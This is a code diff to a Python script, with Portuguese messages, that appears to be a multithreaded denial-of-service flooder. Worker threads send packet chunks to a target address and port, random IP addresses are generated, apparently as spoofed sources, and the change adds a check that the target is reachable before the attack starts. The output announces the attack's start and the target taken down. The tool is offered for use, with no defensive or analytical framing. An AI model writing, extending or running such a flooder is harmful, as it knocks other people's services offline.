@@ -5,9 +5,18 @@ import random
 import requests
 import threading
 import argparse
+import socket
 
 LOCK = threading.Lock()
 event = threading.Event()
+
+
+def test_connection(target: str, port: int) -> bool:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        status: int = s.connect_ex((target, port))
+
+        return status == 0
+
 
 def get_ips(rang: int) -> list[str]:
         random_ips = [ipaddress.IPv4Address(random.randint(0, 2**32 - 1)) for _ in range(rang)]
@@ -30,8 +39,9 @@ def worker(target: str, port: int, verbose: bool, chunk: int, worker_id: str = '
                 send(packages, verbose=False)
 
                 if verbose:
-                        with LOCK:
-                                print (f'INFO\t {chunk} pacotes enviados para {target}:{port} - WORKER::{worker_id}')
+                        if not event.is_set():
+                                with LOCK:
+                                        print (f'INFO\t {chunk} pacotes enviados para {target}:{port} - WORKER::{worker_id}')
 
 
 class Args:
@@ -62,7 +72,12 @@ class Args:
 def main():
         args = Args()
 
-        print (f'[+] Iniciando ataque contra {args.taddr}:{args.tport} com {args.threads} workers')
+        is_up: bool = test_connection(args.taddr, args.tport)
+        if not is_up:
+                print(f'[\033[31m-\033[m] Erro ao se conectar ao destino.')
+                return
+
+        print (f'[\033[32m+\033[m] Iniciando ataque contra {args.taddr}:{args.tport} com {args.threads} workers')
 
         threads: list[tuple] = []
         worker_ids = [i for i in range(1, args.threads + 1)]
@@ -94,7 +109,7 @@ def main():
                 worker_id += 1
 
         end = perf_counter()
-        print (f'[+] Alvo derrubado -> 500')
+        print (f'[\033[32m+\033[m] Alvo derrubado -> 500')
 
         for t in threads:
                 t[0].join()
